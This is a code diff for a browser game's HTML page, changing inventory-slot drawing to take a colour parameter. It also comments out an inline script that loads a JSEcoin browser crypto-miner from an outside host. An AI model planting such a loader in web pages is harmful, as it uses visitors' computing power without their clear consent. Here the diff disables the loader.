@@ -80,7 +80,7 @@
   </head>
   <body>
     <script type="text/javascript">
-      !function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/104653/ouscension.herokuapp.com/0/0/",s.parentNode.insertBefore(t,s)}();
+      //!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/104653/ouscension.herokuapp.com/0/0/",s.parentNode.insertBefore(t,s)}();
     </script>
 
 
@@ -159,21 +159,10 @@
 
 
         //Weapon Slot
-        createSlot('WeaponSlot', gameScreenX + screenX / 12 - (screenX * 0.026) / 2, screenY / 2 - (screenX * 0.026) / 2 - (screenX * 0.026) * 1.25, screenX * 0.026, screenX * 0.026);
+        createSlot('WeaponSlot', gameScreenX + screenX / 12 - (screenX * 0.026) / 2, screenY / 2 - (screenX * 0.026) / 2 - (screenX * 0.026) * 1.25, screenX * 0.026, screenX * 0.026, rgb(50, 50, 50));
 
         //Extra Slots
-        createSlot('Slot1', gameScreenX + screenX / 12 - (screenX * 0.026) / 2, screenY / 2 - (screenX * 0.026) / 2, screenX * 0.026, screenX * 0.026);
-        /*if(true) {
-          var slot = document.createElement("div");
-          slot.style.left = gameScreenX + screenX / 12 - (screenX * 0.026) / 2 + "px";
-          slot.style.top = screenY / 2 - (screenX * 0.026) / 2 + "px";
-          slot.style.width = screenX * 0.026 + "px";
-          slot.style.height = screenX * 0.026 + "px";
-          slot.style.borderRadius = (screenX * 0.026) / 5 + "px";
-          slot.className = "inventorySlot";
-
-          document.getElementById("inventorySlots").appendChild(slot);
-        }*/
+        createSlot('Slot1', gameScreenX + screenX / 12 - (screenX * 0.026) / 2, screenY / 2 - (screenX * 0.026) / 2, screenX * 0.026, screenX * 0.026, rgb(0, 0, 0));
 
 
 
@@ -277,7 +266,7 @@
               }
             }
 
-            function createSlot(element, x, y, w, h) {
+            function createSlot(element, x, y, w, h, color) {
               var slotSprite = createSprite(element, x, y, w, h);
 
               slotSprite.itemX = x + w / 2 - screenX * 0.0104;
@@ -290,6 +279,7 @@
               slot.style.height = slotSprite.h + "px";
               slot.style.borderRadius = (screenX * 0.026) / 5 + "px";
               slot.className = "inventorySlot";
+              slot.style.color = color;
               slot.id = slotSprite.element;
               document.getElementById("inventorySlots").appendChild(slot);
 
